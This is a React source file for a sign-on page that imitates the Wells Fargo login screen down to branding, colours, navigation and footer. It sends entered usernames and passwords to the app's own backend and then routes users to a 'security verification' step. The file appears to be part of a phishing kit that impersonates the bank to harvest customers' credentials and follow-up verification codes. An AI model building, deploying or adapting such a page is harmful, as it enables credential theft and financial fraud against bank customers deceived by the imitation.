import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Link, useLocation } from "wouter";
import { OfficialFooter, DesktopDisclosure } from "@/components/official-footer";
import wfBg from "@assets/IMG_3610_1774119228553.jpeg";

type LoginFormData = { username: string; password: string };

function getGreeting() {
  const h = new Date().getHours();
  if (h < 12) return "Good morning";
  if (h < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [usernameValue, setUsernameValue] = useState("");
  const [biometricLoading, setBiometricLoading] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      if (!challengeRes.ok) throw new Error();
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;
      if (credential) {
        const r = credential.response as AuthenticatorAssertionResponse;
        const flags = new Uint8Array(r.authenticatorData)[32];
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode(...Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode(...Array.from(new Uint8Array(r.signature)))),
            authenticatorData: btoa(String.fromCharCode(...Array.from(new Uint8Array(r.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode(...Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified: (flags & 0x04) !== 0,
            userPresent: (flags & 0x01) !== 0,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });
        if (authRes.ok) {
          const d = await authRes.json();
          sessionStorage.setItem("loginUsername", d.user?.id || "biometric_user");
          toast({ title: "Sign On Successful" });
          setLocation("/verify");
        }
      }
    } catch {
      // passkey not available or cancelled
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({ defaultValues: { username: "", password: "" } });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const res = await apiRequest("POST", "/api/auth/login", data);
      const result = await res.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({ title: "Sign On Successful", description: "Please complete security verification..." });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({ title: "Sign On Failed", description: error.message || "Invalid credentials", variant: "destructive" });
    },
  });

  const onSubmit = (data: LoginFormData) => loginMutation.mutate(data);

  /* ── Shared login card ── */
  const LoginCard = ({ isDesktop = false }: { isDesktop?: boolean }) => (
    <div
      style={{
        width: isDesktop ? 380 : "100%",
        backgroundColor: "#fff",
        borderRadius: 12,
        boxShadow: "0 4px 24px rgba(0,0,0,0.18)",
        padding: isDesktop ? "36px 40px 32px" : "28px 20px 36px",
      }}
    >
      {/* Greeting */}
      <h1
        style={{
          fontFamily: "Georgia, 'Times New Roman', serif",
          fontSize: isDesktop ? 30 : 28,
          fontWeight: 400,
          color: "#111",
          textAlign: "center",
          marginBottom: 24,
          lineHeight: 1.15,
        }}
        data-testid="text-greeting"
      >
        {greeting}
      </h1>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        {/* Username */}
        <div style={{ position: "relative", marginBottom: 10 }}>
          <input
            {...form.register("username", { required: true })}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            onChange={(e) => { form.setValue("username", e.target.value); setUsernameValue(e.target.value); }}
            data-testid="input-username"
            style={{
              width: "100%",
              height: 48,
              border: "1px solid #b0b0b0",
              borderRadius: 4,
              padding: "0 40px 0 12px",
              fontSize: 15,
              color: "#222",
              backgroundColor: "#fff",
              outline: "none",
              boxSizing: "border-box",
            }}
            onFocus={e => e.target.style.borderColor = "#5a5a5a"}
            onBlur={e => e.target.style.borderColor = "#b0b0b0"}
          />
          {usernameValue && (
            <button
              type="button"
              onMouseDown={e => e.preventDefault()}
              onClick={() => { form.setValue("username", ""); setUsernameValue(""); }}
              data-testid="button-clear-username"
              style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", padding: 0 }}
            >
              <svg viewBox="0 0 20 20" width="18" height="18" fill="none">
                <circle cx="10" cy="10" r="9" stroke="#999" strokeWidth="1.5"/>
                <path d="M7 7l6 6M13 7l-6 6" stroke="#999" strokeWidth="1.5" strokeLinecap="round"/>
              </svg>
            </button>
          )}
        </div>

        {/* Password */}
        <div style={{ position: "relative", marginBottom: 14 }}>
          <input
            {...form.register("password", { required: true })}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            data-testid="input-password"
            style={{
              width: "100%",
              height: 48,
              border: "1px solid #b0b0b0",
              borderRadius: 4,
              padding: "0 52px 0 12px",
              fontSize: 15,
              color: "#222",
              backgroundColor: "#fff",
              outline: "none",
              boxSizing: "border-box",
            }}
            onFocus={e => e.target.style.borderColor = "#5a5a5a"}
            onBlur={e => e.target.style.borderColor = "#b0b0b0"}
          />
          <button
            type="button"
            onMouseDown={e => e.preventDefault()}
            onClick={() => setShowPassword(!showPassword)}
            data-testid="button-toggle-password"
            style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", fontSize: 14, fontWeight: 600, color: "#1964b5", padding: 0 }}
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        {/* Save username */}
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
          <input
            type="checkbox"
            id="saveUsername"
            checked={saveUsername}
            onChange={e => setSaveUsername(e.target.checked)}
            data-testid="checkbox-save-username"
            style={{ width: 15, height: 15, cursor: "pointer", accentColor: "#c41230" }}
          />
          <label htmlFor="saveUsername" style={{ fontSize: 14, color: "#222", cursor: "pointer", userSelect: "none" }}>
            Save username
          </label>
        </div>

        {/* Security note */}
        <p style={{ fontSize: 12, color: "#666", lineHeight: 1.45, marginBottom: 22 }}>
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        {/* Sign on button */}
        <div style={{ display: "flex", justifyContent: "center", marginBottom: 14 }}>
          <button
            type="submit"
            disabled={loginMutation.isPending}
            data-testid="button-sign-on"
            style={{
              height: 44,
              width: 200,
              borderRadius: 99,
              border: "none",
              backgroundColor: "#c5c5c5",
              color: "#777",
              fontSize: 15,
              fontWeight: 600,
              cursor: "pointer",
              opacity: loginMutation.isPending ? 0.6 : 1,
              letterSpacing: "0.01em",
            }}
          >
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      {/* OR divider */}
      <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 14 }}>
        <div style={{ flex: 1, height: 1, backgroundColor: "#ddd" }} />
        <span style={{ fontSize: 13, color: "#888" }}>or</span>
        <div style={{ flex: 1, height: 1, backgroundColor: "#ddd" }} />
      </div>

      {/* Passkey button */}
      <div style={{ display: "flex", justifyContent: "center", marginBottom: 12 }}>
        <button
          type="button"
          onClick={handleBiometricLogin}
          disabled={biometricLoading}
          data-testid="button-passkey"
          style={{
            height: 44,
            width: 200,
            borderRadius: 99,
            border: "1.5px solid #222",
            backgroundColor: "#fff",
            color: "#111",
            fontSize: 14,
            fontWeight: 600,
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 7,
            opacity: biometricLoading ? 0.6 : 1,
          }}
        >
          {/* Person+key icon */}
          <svg viewBox="0 0 22 22" width="17" height="17" fill="none" aria-hidden="true">
            <circle cx="8.5" cy="6.5" r="3.5" stroke="#222" strokeWidth="1.5"/>
            <path d="M1.5 18.5c0-3.6 3.1-6.5 7-6.5" stroke="#222" strokeWidth="1.5" strokeLinecap="round"/>
            <circle cx="16.5" cy="15" r="3" stroke="#222" strokeWidth="1.5"/>
            <path d="M18.9 17.4l1.6 1.6" stroke="#222" strokeWidth="1.4" strokeLinecap="round"/>
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      {/* Passkey help text */}
      <p style={{ fontSize: 11.5, color: "#666", lineHeight: 1.45, marginBottom: 28, textAlign: "center" }}>
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      {/* Forgot link */}
      <div style={{ textAlign: "center" }}>
        <Link
          href="/forgot-password"
          data-testid="link-forgot"
          style={{ fontSize: 13.5, color: "#1964b5", textDecoration: "none", display: "inline-flex", alignItems: "center", gap: 4 }}
        >
          <span style={{ fontSize: 13 }}>→</span>
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  return (
    <>
      {/* ── DESKTOP ── */}
      <div
        className="hidden lg:flex flex-col min-h-screen"
        style={{
          backgroundImage: `url(${wfBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center top",
          backgroundAttachment: "fixed",
        }}
      >
        {/* Header */}
        <header style={{ backgroundColor: "#c41230", flexShrink: 0 }}>
          <div style={{ height: 46, display: "flex", alignItems: "center", justifyContent: "space-between", padding: "0 24px" }}>
            {/* Logo */}
            <span style={{ fontFamily: "'Times New Roman', Georgia, serif", fontWeight: 700, fontSize: 20, color: "#fff", letterSpacing: "0.12em" }}>
              WELLS FARGO
            </span>
            {/* Nav */}
            <div style={{ display: "flex", alignItems: "center", gap: 20, color: "#fff", fontSize: 13 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
                <svg viewBox="0 0 16 16" width="12" height="12" fill="none">
                  <rect x="3" y="7" width="10" height="8" rx="1" stroke="white" strokeWidth="1.4"/>
                  <path d="M5.5 7V5a2.5 2.5 0 015 0v2" stroke="white" strokeWidth="1.4" strokeLinecap="round"/>
                </svg>
                <Link href="/register" style={{ color: "#fff", textDecoration: "none" }} data-testid="link-enroll">Enroll</Link>
              </div>
              <span style={{ cursor: "pointer" }}>Customer Service</span>
              <span style={{ cursor: "pointer" }}>ATMs/Locations</span>
              <span style={{ cursor: "pointer" }}>Español</span>
              {/* Search */}
              <div style={{ display: "flex", alignItems: "center", backgroundColor: "#fff", borderRadius: 2, overflow: "hidden", height: 26 }}>
                <span style={{ padding: "0 8px", fontSize: 12, color: "#888" }}>Search</span>
                <div style={{ width: 26, height: 26, backgroundColor: "#c41230", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
                  <svg viewBox="0 0 16 16" width="13" height="13" fill="none">
                    <circle cx="6.5" cy="6.5" r="4.5" stroke="white" strokeWidth="1.5"/>
                    <path d="M10 10l3.5 3.5" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
                  </svg>
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Card area */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "calc(100vh - 46px)", padding: "48px 0 0" }}>
          <LoginCard isDesktop={true} />
        </div>

        {/* Disclosure */}
        <div style={{ display: "flex", justifyContent: "center", paddingTop: 32 }}>
          <DesktopDisclosure />
        </div>

        {/* Footer */}
        <OfficialFooter />
      </div>

      {/* ── MOBILE ── */}
      <div className="lg:hidden min-h-screen flex flex-col bg-white">
        <header className="bg-[#c41230] flex items-center px-4" style={{ height: 52 }}>
          <div className="flex-1" />
          <span
            className="text-white font-bold text-[17px] tracking-[0.16em]"
            style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
          >
            WELLS FARGO
          </span>
          <div className="flex-1 flex justify-end">
            <button type="button" aria-label="Menu" data-testid="button-mobile-menu" className="flex flex-col justify-center gap-[5px] py-2">
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
            </button>
          </div>
        </header>
        <div className="h-[3px] bg-[#ffcd41]" />
        <main className="flex-1 bg-white overflow-y-auto">
          <div className="px-[18px] pt-7 pb-10">
            <LoginCard isDesktop={false} />
          </div>
        </main>
        <OfficialFooter />
      </div>
    </>
  );
}
